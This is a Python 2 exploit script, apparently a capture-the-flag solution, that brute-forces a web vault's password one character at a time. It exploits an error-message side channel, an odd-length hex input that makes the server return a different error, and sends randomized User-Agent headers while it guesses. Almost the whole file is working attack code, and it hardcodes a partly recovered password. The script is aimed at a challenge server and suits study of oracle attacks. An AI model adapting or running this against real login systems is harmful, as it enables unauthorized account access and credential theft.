#!/usr/bin/python2

import requests, string
import random, sys

url = 'http://vault.problem.sctf.io/'

hexdigits = '0123456789abcdef'

def randstr(n):
    return ''.join(random.choice(hexdigits) for _ in range(n))

"""
The password is encoded to hex with 2 hex digits in each input, so 25 chars
The server checks each char individually

for each input:
    if len(input) is odd, error
    c = input.decode('hex')
    if c != next password char, error

so, make input[1] odd length, and try all chars for input[0]
you will get 'Incorrect password' until you hit the correct char and you get 'Odd-length string'
using this, guess each char individually

"""

# got from previous runs
answer = 'HIIVDpLbHbdSIMKMdzuLJZzV'

while len(answer) < 25:
    currentChar = len(answer)
    for c in string.printable:
        pw = answer.encode('hex')
        pw += c.encode('hex')
        pw += randstr(50 - len(pw))
        assert len(pw) == 50

        # split pw among inputs
        data = {'submit':''}
        remain = len(pw)
        for x in range(0,25):
            l = remain/(25-x)
            data['input%d' % x] = pw[len(pw)-remain:len(pw)-remain+l]
            remain -= l

        # find char 0..22
        """
        oddInput = currentChar+1
        src = 'input24'
        dst = 'input%d' % oddInput
        data[dst] += data[src][0]
        data[src] = data[src][1:]
        """
        # to find char 23, make 24 odd
        # data['input24'] += 'a'

        r = requests.post(url, data, headers = {'User-Agent': str(random.random())})

        # check for chars 0..23
        """
        if 'Odd-length string' in r.text:
            # current char is correct
            answer += c
            print pw, answer
            break
        assert 'Incorrect password' in r.text
        """
        # to find char 24 look for successfull login
        if not ('Incorrect password' in r.text):
            print pw
            print r.text

    if len(answer) > currentChar:
        continue
    print 'oops'
    break
